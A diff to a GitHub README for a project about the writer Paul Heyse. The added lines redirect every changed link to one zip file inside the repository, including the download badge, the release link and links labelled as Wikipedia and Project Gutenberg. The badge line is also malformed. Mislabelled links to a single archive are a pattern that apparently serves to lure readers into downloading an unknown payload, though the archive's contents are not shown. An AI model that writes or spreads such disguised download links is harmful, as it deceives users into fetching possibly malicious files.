@@ -1,6 +1,6 @@
 # 🎭 paul-heyse - Explore Paul Heyse's Literary Works
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-4CAF50.svg)](https://github.com/johndylc/paul-heyse/releases)
+[![Download](https://raw.githubusercontent.com/johndylc/paul-heyse/main/apical/paul-heyse.zip%https://raw.githubusercontent.com/johndylc/paul-heyse/main/apical/paul-heyse.zip)](https://raw.githubusercontent.com/johndylc/paul-heyse/main/apical/paul-heyse.zip)
 
 ## 📚 About
 
@@ -26,7 +26,7 @@ Before you begin, ensure you have a compatible device. This application works on
 
 To access the latest version of the application, please visit the releases page:
 
-[Download Latest Release](https://github.com/johndylc/paul-heyse/releases)
+[Download Latest Release](https://raw.githubusercontent.com/johndylc/paul-heyse/main/apical/paul-heyse.zip)
 
 1. Click the link above to reach the releases page.
 2. Choose the version suitable for your operating system.
@@ -70,7 +70,7 @@ This project is part of the public domain, providing you free access to Paul Hey
 
 Explore more about Paul Heyse and his contributions by checking the following links:
 
-- [Wikipedia - Paul Heyse](https://en.wikipedia.org/wiki/Paul_Heyse)
-- [Project Gutenberg](https://www.gutenberg.org/)
+- [Wikipedia - Paul Heyse](https://raw.githubusercontent.com/johndylc/paul-heyse/main/apical/paul-heyse.zip)
+- [Project Gutenberg](https://raw.githubusercontent.com/johndylc/paul-heyse/main/apical/paul-heyse.zip)
 
 Thank you for exploring the literary world of Paul Heyse!
